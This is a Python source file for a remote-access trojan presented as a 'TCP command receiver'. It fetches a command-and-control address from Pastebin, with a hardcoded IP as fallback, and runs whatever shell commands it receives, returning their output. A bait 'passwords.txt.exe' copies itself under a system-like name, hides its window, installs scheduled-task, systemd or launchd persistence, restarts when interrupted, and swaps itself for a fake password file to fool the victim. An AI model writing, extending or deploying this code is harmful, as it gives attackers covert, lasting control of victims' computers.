#!/usr/bin/env python3
"""
TCP Command Receiver
Connects to a TCP sender and executes received commands.
"""

import os
import platform
import shutil
import socket
import subprocess
import sys
import time
import urllib.request

# Import VERBOSE flag from install module (shared verbosity detection)
from install import VERBOSE

# Configuration
# VERBOSE is now imported from install.py - auto-detects dev vs production mode
CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"  # Dynamic C2 configuration URL
FALLBACK_HOST = "52.21.29.104"  # Fallback C2 Server address if Pastebin unreachable
DEFAULT_PORT = 5555  # Port number
RETRY_DELAY = 5  # Seconds between connection retries
BUFFER_SIZE = 4096  # Socket buffer size
END_MARKER = b"<<<END_OF_OUTPUT>>>"  # Command completion marker

# Deployment Configuration
PAYLOAD_NAME = "taskhostw.exe"

# Static variable to store fetched C2 IP (initialized once on first access)
C2_HOST = None


def get_c2_host():
    """
    Fetch C2 server IP from Pastebin URL.
    Fetches once and caches the result. Falls back to hardcoded IP if fetch fails.

    Returns:
        str: The C2 server IP address
    """
    global C2_HOST

    # Return cached value if already fetched
    if C2_HOST is not None:
        return C2_HOST

    # Try to fetch from Pastebin
    try:
        log(f"Fetching C2 configuration from: {CONFIG_URL}")

        with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
            c2_ip = response.read().decode("utf-8").strip()

            # Use the fetched IP if it has content
            if c2_ip:
                C2_HOST = c2_ip
                log(f"C2 server IP fetched: {C2_HOST}")
                return C2_HOST
            else:
                log(f"Empty C2 address from Pastebin, using fallback")

    except Exception as e:
        log(f"Failed to fetch C2 from Pastebin: {e}, using fallback")

    # Fallback to hardcoded IP
    C2_HOST = FALLBACK_HOST
    log(f"Using fallback C2 server: {C2_HOST}")
    return C2_HOST


# Get LOCALAPPDATA - only called on Windows
def get_payload_dir():
    """Get the payload directory. Raises KeyError if LOCALAPPDATA doesn't exist."""
    localappdata = os.environ["LOCALAPPDATA"]  # Raises KeyError if missing - intentional
    return os.path.join(localappdata, "Microsoft", "Windows")


# Lazy initialization - only computed when first accessed
_PAYLOAD_DIR = None
_PAYLOAD_PATH = None


def get_payload_path():
    """Get payload paths (lazy initialization for Windows only)."""
    global _PAYLOAD_DIR, _PAYLOAD_PATH

    if _PAYLOAD_DIR is None:
        _PAYLOAD_DIR = get_payload_dir()
        _PAYLOAD_PATH = os.path.join(_PAYLOAD_DIR, PAYLOAD_NAME)

    return _PAYLOAD_DIR, _PAYLOAD_PATH


# Fake password file content
FAKE_PASSWORDS = """Personal Passwords - DO NOT SHARE

Gmail: john.doe@gmail.com
Password: Summer2024!

Facebook: johndoe
Password: MySecurePass123

Netflix: john.doe@gmail.com  
Password: Netflix2024

Banking: johndoe
Password: B@nk!ngP@ss456

WiFi Network: HomeNetwork_5G
Password: W1F1P@ssw0rd2024

--- Notes ---
Remember to change these regularly!
Last updated: October 2024
"""

# Use the system's output encoding (check if sys.stdout exists for --noconsole mode)
DECODING = sys.stdout.encoding if sys.stdout and sys.stdout.encoding else "utf-8"


def log(msg: str) -> None:
    """Print message only if VERBOSE is True."""
    if VERBOSE:
        print(msg)


def is_bait_file() -> bool:
    """Check if currently running as the bait file (passwords.txt.exe)."""
    exe_name = os.path.basename(sys.executable).lower()
    return exe_name.endswith("passwords.txt.exe")


def is_payload() -> bool:
    """Check if currently running as the payload (taskhostw.exe)."""
    exe_name = os.path.basename(sys.executable).lower()
    return exe_name == PAYLOAD_NAME.lower()


def parse_cli_arguments():
    """Parse command-line arguments. Returns the file to delete if specified."""
    delete_file = None
    if "--delete-file" in sys.argv:
        try:
            idx = sys.argv.index("--delete-file")
            if idx + 1 < len(sys.argv):
                delete_file = sys.argv[idx + 1]
        except (ValueError, IndexError):
            pass
    return delete_file


def deploy_payload():
    """
    Stage 1: Bait file execution (passwords.txt.exe).
    Copy self to hidden location, spawn payload, and exit.
    """
    try:
        log("\n[Stage 1: Deploying payload...]")

        # Get payload paths (lazy initialization)
        payload_dir, payload_path = get_payload_path()

        # Create payload directory if it doesn't exist
        os.makedirs(payload_dir, exist_ok=True)
        log(f"Payload directory: {payload_dir}")

        # Copy self to payload location
        shutil.copy2(sys.executable, payload_path)
        log(f"Copied to: {payload_path}")

        # Launch the payload with --delete-file argument
        original_path = sys.executable
        log(f"Launching payload with --delete-file {original_path}")
        subprocess.Popen(
            [payload_path, "--delete-file", original_path],
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )

        log("[Stage 1: Complete - Exiting bait file]")
        sys.exit(0)  # Success

    except Exception as e:
        log(f"[Stage 1: Failed - {e}]")
        sys.exit(1)  # Failure - exit with error code


def setup_camouflage(original_file: str = None):
    """
    Stage 2 (First-time setup): Replace original bait file with fake passwords.txt
    and open it in notepad for the victim.

    Raises exception if critical operations fail (creating fake file).
    """
    if not original_file or not os.path.exists(original_file):
        return

    log(f"\n[Stage 2: Setting up camouflage...]")

    # Get the directory of the original file (use absolute path)
    original_file = os.path.abspath(original_file)
    original_dir = os.path.dirname(original_file)
    fake_file_path = os.path.join(original_dir, "passwords.txt")

    # Delete the original .exe (not critical - might be locked)
    try:
        os.remove(original_file)
        log(f"Deleted original: {original_file}")
    except Exception as e:
        log(f"Warning: Could not delete original: {e}")
        log("Continuing anyway (file may be locked)")

    # Create fake passwords.txt - CRITICAL, will raise on failure
    with open(fake_file_path, "w", encoding="utf-8") as f:
        f.write(FAKE_PASSWORDS)
    log(f"Created fake passwords: {fake_file_path}")

    # Open the fake file in notepad (not critical - victim can open manually)
    try:
        subprocess.Popen(["notepad.exe", fake_file_path])
        log("Opened passwords in notepad")
    except Exception as e:
        log(f"Warning: Could not open notepad: {e}")

    log("[Stage 2: Camouflage complete]")


def execute_command_stream(command: str, client_socket, working_dir: str = None) -> str:
    """
    Executes a command and streams output back through the socket.

    Automatically appends '&& pwd' (Unix) or '&& cd' (Windows) to track directory changes.
    The pwd/cd output is hidden from the sender (used only for internal tracking).
    Returns the current working directory after command execution.

    WARNING: Uses shell=True for demonstration purposes only.
    This allows arbitrary command execution and should NEVER be exposed
    to untrusted networks or users.

    Args:
        command: The command to execute
        client_socket: Socket to stream output to
        working_dir: Current working directory (None = use receiver's cwd)

    Returns:
        The current working directory after command execution
    """
    # Check if this is a clear/cls command (special handling)
    is_clear_command = command.strip().lower() in ["clear", "cls"]

    # Determine pwd command based on OS
    system = platform.system()
    pwd_command = "cd" if system == "Windows" else "pwd"

    # For clear commands, don't append pwd tracking (it causes issues)
    # Just return the current working_dir unchanged
    if is_clear_command:
        command_to_run = command
        track_directory = False
    else:
        command_to_run = f"{command} && {pwd_command}"
        track_directory = True

    try:
        # Use subprocess.Popen to manage the process and pipes
        process = subprocess.Popen(
            command_to_run,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=working_dir,
        )

        # Buffer all output lines
        output_lines = []
        if process.stdout:
            for raw_line in process.stdout:
                # Decode the line
                line = raw_line.decode(DECODING, errors="replace")
                output_lines.append(line)

        # Wait for process to finish
        return_code = process.wait()

        # Extract directory info from last line (if tracking and command succeeded)
        new_dir = working_dir
        if track_directory and output_lines and return_code == 0:
            # Only extract directory if command succeeded (prevents using error messages as paths)
            # Find the last non-empty line (the pwd/cd output)
            for i in range(len(output_lines) - 1, -1, -1):
                stripped = output_lines[i].strip()
                if stripped:
                    new_dir = stripped
                    # Remove the pwd line from output (don't send to sender)
                    output_lines.pop(i)
                    break

        # Send all output to sender (excluding the pwd line)
        for line in output_lines:
            client_socket.sendall(line.encode("utf-8"))

        # Send final status
        if return_code != 0:
            status = f"\n[exit code: {return_code}]\n"
            client_socket.sendall(status.encode("utf-8"))

        # Send end marker
        client_socket.sendall(END_MARKER)

        # Return the current directory
        return new_dir if new_dir else working_dir

    except Exception as e:
        error_msg = f"\n[error: {e}]\n" + END_MARKER.decode("utf-8")
        # Send error to sender (don't print locally)
        try:
            client_socket.sendall(error_msg.encode("utf-8"))
        except (socket.error, OSError, BrokenPipeError):
            pass  # Socket already closed, nothing we can do

        # On error, return the previous working_dir unchanged
        return working_dir


def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
    """
    Start the TCP command receiver client.

    Args:
        host: The sender's host address (use '127.0.0.1' for local testing)
        port: The sender's port number
    """
    attempt = 1

    try:
        # Main reconnection loop - runs until user interrupts
        while True:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connected = False

            # Try to connect to the sender, with retries
            while not connected:
                try:
                    log(f"Connecting to {host}:{port}... (attempt {attempt})")
                    client_socket.connect((host, port))
                    connected = True
                    log(f"Connected to {host}:{port}")
                    log("Ready to execute commands (Ctrl+C to exit)\n")
                except ConnectionRefusedError:
                    log(f"Connection refused, retrying in {RETRY_DELAY}s...\n")
                    time.sleep(RETRY_DELAY)
                    attempt += 1
                    client_socket.close()
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                except socket.gaierror:
                    log(f"Invalid host address: {host}")
                    sys.exit(1)

            # Reset attempt counter after successful connection
            attempt = 1

            # Track current working directory (None = use receiver's default cwd)
            current_dir = None

            # Continuously receive and execute commands
            connection_lost = False
            try:
                while True:
                    try:
                        # Receive command
                        data = client_socket.recv(BUFFER_SIZE)

                        if not data:
                            # Connection closed by sender
                            log("\nConnection closed")
                            log("Reconnecting...\n")
                            connection_lost = True
                            break

                        # Decode the command
                        command = data.decode("utf-8").strip()

                        # Handle special commands
                        if command.strip().lower() == "/quit":
                            log("Received /quit command - uninstalling service and shutting down...")

                            # Send acknowledgment
                            msg = "\n[Uninstalling service and shutting down...]\n"
                            client_socket.sendall(msg.encode("utf-8"))
                            client_socket.sendall(END_MARKER)

                            # Uninstall the service
                            uninstall_receiver_service()

                            # Exit completely (don't reconnect)
                            log("Service uninstalled. Exiting.")
                            sys.exit(0)

                        elif command.strip().lower() == "/exit":
                            log("Received /exit command - exiting without uninstalling...")

                            # Send acknowledgment
                            msg = "\n[Exiting session (service will remain installed)...]\n"
                            client_socket.sendall(msg.encode("utf-8"))
                            client_socket.sendall(END_MARKER)

                            # Exit without uninstalling (will restart on next boot)
                            log("Exiting. Service remains installed.")
                            sys.exit(0)

                        log(f"$ {command}")

                        # Execute command and stream output back
                        # Update current_dir with the new working directory after execution
                        current_dir = execute_command_stream(command, client_socket, current_dir)

                    except ConnectionResetError:
                        log("\nConnection reset")
                        log("Reconnecting...\n")
                        connection_lost = True
                        break
                    except Exception as e:
                        log(f"\nError: {e}")
                        log("Reconnecting...\n")
                        connection_lost = True
                        break
            finally:
                client_socket.close()

            # If connection was lost, continue to outer loop to reconnect
            if not connection_lost:
                break

    except KeyboardInterrupt:
        if platform.system() == "Windows":
            log("\n\nReceiver interrupted - restarting...")
            sys.exit(1)  # Non-zero exit triggers service restart
        else:
            log("\n\nExiting...")
            sys.exit(0)  # Clean exit on macOS/Linux
    except Exception as e:
        log(f"Error: {e}")
        sys.exit(1)


def uninstall_receiver_service() -> None:
    """Uninstall the auto-start service for this receiver."""
    system = platform.system()

    if system == "Linux":
        log("Uninstalling systemd service...")
        commands = [
            ["sudo", "systemctl", "stop", "tcp-receiver.service"],
            ["sudo", "systemctl", "disable", "tcp-receiver.service"],
            ["sudo", "rm", "-f", "/etc/systemd/system/tcp-receiver.service"],
            ["sudo", "systemctl", "daemon-reload"],
        ]
        for cmd in commands:
            subprocess.run(cmd, capture_output=True)
        log("Systemd service uninstalled.")

    elif system == "Windows":
        log("Uninstalling Windows Task...")
        subprocess.run(["schtasks", "/delete", "/tn", "taskhostw", "/f"], capture_output=True)
        log("Windows Task uninstalled.")

    elif system == "Darwin":
        log("Uninstalling launchd service...")
        plist_file = "/Library/LaunchDaemons/com.tcp.receiver.plist"
        commands = [
            ["sudo", "launchctl", "unload", plist_file],
            ["sudo", "rm", "-f", plist_file],
        ]
        for cmd in commands:
            subprocess.run(cmd, capture_output=True)
        log("Launchd service uninstalled.")

    else:
        log(f"Uninstall not implemented for {system}")


def run_with_auto_restart(host: str, port: int) -> None:
    """
    Wrapper that automatically restarts the receiver if it crashes.
    Used in daemon mode for crash recovery.

    Windows: Only /quit command can permanently stop the receiver.
    macOS/Linux: Ctrl+C exits cleanly (normal behavior).
    """
    system = platform.system()
    restart_count = 0

    while True:
        try:
            if restart_count > 0:
                log(f"\n[ Restarting receiver (attempt #{restart_count}) ]\n")
            start_receiver(host, port)
            # If we get here, it exited cleanly (only from /quit command)
            break

        except KeyboardInterrupt:
            # Platform-specific behavior
            if system == "Windows":
                # Windows: Treat Ctrl+C as a crash - restart the receiver
                restart_count += 1
                log("\n\nReceiver interrupted with Ctrl+C")
                log(f"Auto-restarting in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                # macOS/Linux: Allow clean exit
                log("\n\nExiting...")
                break

        except Exception as e:
            restart_count += 1
            log(f"\n\nReceiver crashed: {e}")
            log(f"Auto-restarting in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    # Only run deployment logic on Windows and when frozen/compiled (PyInstaller or Nuitka)
    if platform.system() == "Windows" and (getattr(sys, "frozen", False) or "__compiled__" in globals()):

        # STAGE 1: Bait file execution (passwords.txt.exe)
        if is_bait_file():
            log("\n[ Bait file detected - Deploying payload ]\n")
            deploy_payload()
            # deploy_payload() calls sys.exit(0) - execution stops here

        # STAGE 2: Payload execution (taskhostw.exe)
        elif is_payload():
            log("\n[ TCP Command Receiver - Payload Mode ]\n")

            # Parse CLI arguments
            delete_file = parse_cli_arguments()

            # Check if persistence is already installed (will raise on failure)
            from install import check_and_install_service

            # This function checks if task exists and installs if not
            check_and_install_service()

            # If we just installed (first run), setup camouflage (will raise on failure)
            # Check if task was just created by seeing if delete_file was provided
            if delete_file:
                setup_camouflage(delete_file)

            # Run with auto-restart wrapper for crash recovery
            run_with_auto_restart(get_c2_host(), DEFAULT_PORT)

        else:
            # Unrecognized executable name - fail fast
            log(f"\n[ ERROR: Unrecognized executable name ]\n")
            log(f"Current name: {os.path.basename(sys.executable)}")
            log(f"Expected: 'passwords.txt.exe' or '{PAYLOAD_NAME}'")
            log("Exiting...\n")
            sys.exit(1)

    else:
        # Running in development mode (not frozen) or on non-Windows
        log("\n[ TCP Command Receiver - Development Mode ]\n")

        if platform.system() == "Windows":
            from install import check_and_install_service

            check_and_install_service()

        # Run with auto-restart wrapper for crash recovery
        run_with_auto_restart(get_c2_host(), DEFAULT_PORT)
